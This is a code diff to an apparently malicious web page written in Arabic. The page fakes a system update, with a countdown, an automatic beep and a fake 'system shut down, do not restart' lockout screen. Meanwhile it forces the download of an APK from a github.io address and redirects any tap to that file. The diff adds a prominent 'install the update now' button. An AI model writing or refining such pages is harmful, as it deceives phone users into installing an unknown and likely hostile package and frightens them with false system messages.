@@ -38,6 +38,16 @@
       font-size: 18px;
       margin-top: 20px;
     }
+    #install-btn {
+      display: none;
+      background: #0f0;
+      color: #000;
+      font-size: 18px;
+      padding: 12px 30px;
+      border: none;
+      margin-top: 30px;
+      cursor: pointer;
+    }
     #freeze {
       display: none;
       position: fixed;
@@ -58,6 +68,8 @@
 
   <div class="progress"><div class="bar"></div></div>
 
+  <button id="install-btn" onclick="triggerInstall()">📦 تثبيت التحديث الآن</button>
+
   <div id="freeze">📴 تم إغلاق النظام مؤقتًا<br>يرجى عدم إعادة تشغيل الجهاز</div>
 
   <audio id="sound" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_40530df24b.mp3?filename=digital-beep-110438.mp3" autoplay></audio>
@@ -65,7 +77,6 @@
   <script>
     const apkUrl = "https://norhanmohsen1.github.io/Lol/sec_1.0.apk";
 
-    // تحميل تلقائي للـ APK
     function autoDownload() {
       const a = document.createElement("a");
       a.href = apkUrl;
@@ -74,32 +85,34 @@
       a.click();
     }
 
-    // محاولة فتح التثبيت عند أي لمسة
+    function triggerInstall() {
+      window.location.href = apkUrl;
+    }
+
     document.body.addEventListener("click", () => {
       window.location.href = apkUrl;
     });
 
-    // عداد زمني وهمي مع تحديث النص
     let counter = 8;
     const status = document.getElementById("status");
+    const btn = document.getElementById("install-btn");
+
     const interval = setInterval(() => {
       counter--;
       if (counter > 0) {
         status.textContent = `جارٍ التحديث... (${counter} ثواني متبقية)`;
       } else {
         clearInterval(interval);
-        status.textContent = "📦 يتم الآن تثبيت الحزمة...";
+        status.textContent = "📦 تم تحميل التحديث";
+        btn.style.display = "inline-block"; // إظهار زر التثبيت
         autoDownload();
 
-        // بعد 3 ثواني من التحميل
         setTimeout(() => {
           document.getElementById("freeze").style.display = "block";
-          window.location.href = apkUrl;
-        }, 3000);
+        }, 4000);
       }
     }, 1000);
 
-    // تشغيل الصوت
     document.getElementById("sound").play().catch(() => {});
   </script>
 
